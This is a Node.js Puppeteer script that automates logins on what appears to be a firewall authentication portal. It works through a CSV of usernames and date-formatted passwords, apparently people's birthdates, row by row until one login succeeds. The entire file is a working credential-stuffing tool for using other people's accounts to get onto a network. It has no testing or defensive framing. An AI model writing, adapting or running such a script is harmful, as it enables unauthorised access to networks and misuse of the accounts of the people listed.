const puppeteer = require('puppeteer');
const fs = require('fs');

//http://192.168.67.1:1000

(async () => {
  let csvread = require('./csvread')

  const browser = await puppeteer.launch({
    headless: false,
    // executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    defaultViewport: null,
    args: ['--start-maximized']
  })
  const [page] = await browser.pages();

  await page.goto("http:0x0.st", {
    waitUntil: 'networkidle2'
  });


  let c = "Sorry, user's concurrent authentication is over limit"
  let s = "This browser window is used to keep your authentication session active. Please leave it open in the background and open a new window to continue." 
  let e = "Firewall authentication failed. Please try again."

  let dateformater = (pd)=>{

    let b = pd.split("/")

    if (b.length!=1){

      if(b[0].length==1){
        b[0]="0"+b[0]
      }
      if(b[1].length==1){
          b[1]="0"+b[1]
      }
      if(b[2].length==2 && b[2]<10){
          b[2]="20"+b[2]
      }
      if(b[2].length==2 && b[2]>60){
          b[2]="19"+b[2]
      }
      return b.join("-")

    }
    else{
      return pd
    }
  }
  
  let trigger = async (un, pd, flag=1,resp=null)=>{

    await page.type('#ft_un',un)

    await page.type('#ft_pd',pd)


    setTimeout(async ()=>{

        if(resp?.status??0==0){

            page.goto("http:0x0.st", {
                waitUntil: 'networkidle2'
            });
        }

    },800)

    var [,resp] = await Promise.all([
      page.click('input[type=submit]'),
      page.waitForNavigation()
    ])

    
    try{

        let o = await page.evaluate(() => {
          return document.querySelector('body > div > div > form > h2').innerText
        });
        return o
    }
    catch{
        return e
    }

  }


  let arr = await csvread('b.csv')
  let un,pd,name,a
  let i =2083//raha

  do{

    [un,pd,name] = arr[i]

    a= await trigger(un,dateformater(pd))

    if(a==s){

        console.log(i,name,"-- success");
        break;

    }
    else if(a==c){
        
        console.log(i,name,"-- concurrent");
    }
    else{
        console.log(i,name,"-- error");
    }

    
    i+=1

  }while(1)


})();
